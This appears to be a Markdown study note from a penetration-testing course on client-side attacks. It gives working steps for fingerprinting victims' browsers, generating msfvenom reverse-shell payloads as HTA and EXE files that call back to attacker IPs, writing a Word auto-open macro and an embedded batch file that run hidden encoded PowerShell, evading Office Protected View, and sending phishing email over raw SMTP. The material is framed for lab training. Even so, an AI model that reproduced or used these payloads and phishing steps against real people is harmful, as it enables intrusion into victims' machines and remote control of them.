# Client Side Attacks
## Table of Contents
- [Client Fingerprinting](#client-fingerprinting)
- [MsfVenom](#msfvenom)
- [Leveraging HTML Applications](#leveraging-html-applications)
  - [HTML Applications](#html-applications)
  - [HTA Attack in Action](#hta-attack-in-action)
- [Exploiting Microsoft Office](#exploiting-microsoft-office)
  - [Microsoft Word Macro](#microsoft-word-macro)
  - [Object Linking and Embedding](#object-linking-and-embedding)
  - [Evading Protected View](#evading-protected-view)
- [Phishing Emails](#phishing-emails)
  - [Fingerprinting](#fingerprinting)
  - [Reverse Shell](#reverse-shell)

## Client Fingerprinting
```sh
kali@kali:/var/www/html$ sudo wget https://github.com/fingerprintjs/fingerprintjs/archive/2.1.4.zip && sudo unzip master.zip && sudo mv fingerprintjs-master/ fp/ && cd fp
```
Then create a `fingerprint2.html` file and add this code:
```html
<!doctype html>
<html>
<head>
  <title>Blank Page</title>
</head>
<body>
  <h1>You have been given the finger!</h1>
  <script src="fingerprint2.js"></script>
  <script>
      var d1 = new Date();
      var options = {};
      Fingerprint2.get(options, function (components) {
        var values = components.map(function (component) { return component.value })
        var murmur = Fingerprint2.x64hash128(values.join(''), 31)
        var clientfp = "Client browser fingerprint: " + murmur + "\n\n";
        var d2 = new Date();
        var timeString = "Time to calculate fingerprint: " + (d2 - d1) + "ms\n\n";
        var details = "Detailed information: \n";
        if(typeof window.console !== "undefined") {
          for (var index in components) {
            var obj = components[index];
            var value = obj.value;
            if (value !== null) {
              var line = obj.key + " = " + value.toString().substr(0, 150);
              details += line + "\n";
            }
          }
        }
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("POST", "/fp/js.php");
        xmlhttp.setRequestHeader("Content-Type", "application/txt");
        xmlhttp.send(clientfp + timeString + details);
      });
  </script>
</body>
</html>
```
Then create a js.php file with the following content:
```php
<?php
$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
$data .= file_get_contents('php://input');
$data .= "---------------------------------\n\n";
file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);
?>
```
In order for this code to work, we need to allow the Apache www-data user to write to the fp directory:
```sh
kali@kali:/var/www/html$ sudo chown www-data:www-data fp
```
Then use a web server to host this code:
```sh
sudo systemctl start apache2
```
Then rdesktop on the win machine, open a browser, and navigate to `http://<kali_attack_server_IP>/fp/fingerprint.html`.

You can later check the User agent using [Parse a User Agent](https://developers.whatismybrowser.com/useragents/parse/).

## Msfvenom
**MsfVenom** is a Metasploit standalone payload generator which is also a replacement for msfpayload and msfencode.
```sh
msfvenom -p <payload_type> -lhost <listener's_IP> -lport <listener_port> -f <filetype> -o <output>
```
Two major types of Payloads:
- **Stager**: They are commonly identified by second (`/`) such as `windows/meterpreter/reverse_tcp`
- **Stageless**: The use of _ instead of the second `/` in the payload name such as `windows/meterpreter_reverse_tcp`  

Listing available formats
```sh
msfvenom --list formats
```

## Leveraging HTML Applications
If a file is created with the extension of **`.hta`** instead of `.html`, Internet Explorer will automatically interpret it as a HTML Application and offer the ability to execute it using the **`mshta.exe`** program.
The purpose of HTML Applications is to allow arbitrary execution of applications directly from Internet Explorer, rather than downloading and manually running an executable.
### HTML Applications
Similar to an HTML page, a typical HTML Application includes html, body, and script tags followed by JavaScript or VBScript code. 
HTA file to open `cmd.exe`:
```hta
<html>
<head>

<script>

  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);
  
</script>

</head>
<body>

<script>
  
  self.close();
    
</script>
  
</body>
</html>
```
We can place this code in a file on our Kali machine (`poc.hta`) and serve it from the Apache web server. Once a victim accesses this file using Internet Explorer.
### HTA Attack in Action
Creating HTA payload with msfvenom (to get reverse shell)
```sh
kali@kali:~$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```
We will host this new HTA application on our Kali machine and launch a Netcat listener to test our attack. 
## Exploiting Microsoft Office
### Microsoft Word Macro
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.
Macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
Creating a Microsoft Word macro is as simple as choosing the *VIEW* ribbon and selecting*Macros*.  

Python script to split Base64 encoded string:
```python
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```

Macro invoking powershell to create a reverse shell:
```vbs
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()
Sub MyMacro()
    Dim Str As String
    
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    ...

    CreateObject("Wscript.Shell").Run Str
End Sub
  
End Sub
```
We must save the containing document as either **`.docm`** or the older **`.doc`** format, which supports embedded macros, but must avoid the **`.docx`** format, which does not support them.
### Object Linking and Embedding
Another popular client-side attack against Microsoft Office abuses [Dynamic Data Exchange (DDE)](https://learn.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN) to execute arbitrary applications from within Office documents, but this has been [patched since December of 2017](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021).

However, we can still leverage [Object Linking and Embedding (OLE)](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding) to abuse Microsoft Office's document-embedding feature. In this attack scenario, we are going to embed a Windows batch file inside a Microsoft Word document.  

Batch file launching reverse shell (execution of PowerShell with a Base64 encoded command):
```bat
START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
```
Next, we will include the above script in a Microsoft Word document. Open Microsoft Word, create a new document, navigate to the *Insert* ribbon, and click the *Object* menu. Here, we will choose the *Create from File* tab and select our newly-created batch script, `launch.bat`.
After embedding the updated batch file, double-clicking it results in a working reverse shell.
### Evading Protected View
This Microsoft Word document is highly effective when served locally, but when served from the Internet, say through an email or a download link, we must bypass another layer of protection known as [Protected View](https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653), which disables all editing and modifications in the document and blocks the execution of macros or embedded objects.  

Like Microsoft Word, Microsoft Publisher allows embedded objects and ultimately code execution in exactly the same manner as Word and Excel, but will not enable Protected View for Internet-delivered documents. We could use the tactics we previously applied to Word to bypass these restrictions, but the downside is that Publisher is less frequently installed than Word or Excel. Still, if your fingerprinting detects an installation of Publisher, this may be a viable and better vector.

## Phishing Emails
### Fingerprinting
Sending a mail using **`nc`**:
```sh
nc -C 192.168.247.55 25		# Send CRLF as line-ending
```
Then chat with the smtp server in the interactive view:
```sh
220 VICTIM Microsoft ESMTP MAIL Service, Version: 10.0.17763.1697 ready at  Sun, 23 Oct 2022 06:08:04 -0400
HELO victim
250 VICTIM Hello [192.168.119.247]
MAIL FROM:olynch@victim
250 2.1.0 olynch@victim....Sender OK
RCPT TO:lhale@victim
250 2.1.5 lhale@victim 
DATA
.354 Start mail input; end with <CRLF>.<CRLF>
From: olynch@victim                                                                                                            
To: lhale@victim
Subject: job application
job application for this company.                                                                                     
Here there is my resumee: http://192.168.119.247/fp/fingerprint.html                                                              .     
.
```

- To get the browser info either:
	- open a nc listener at `192.168.119.247` port `80`
	- check the `apache2` access log (`/var/log/apache2/access.log`) for `GET` requests
- Result
	```sh
	192.168.247.55 - - [23/Oct/2022:06:14:48 -0400] "GET /fp/fingerprint.html HTTP/1.1" 200 935 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko;"
	```
### Reverse Shell
1. Create and host a Windows PE payload (`.exe` executable) 
```sh
sudo msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.247 lport=443 -f exe -o /var/www/html/evil.exe
```
2. Start a listener with
```sh
sudo nc -lvnp 4444
```
3. Send the phishing email containing the link: http://<IP>/evil.exe
4. Receive a reverse shell on the netcat listener

## Reference
- [Meterpreter Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#meterpreter-shell)
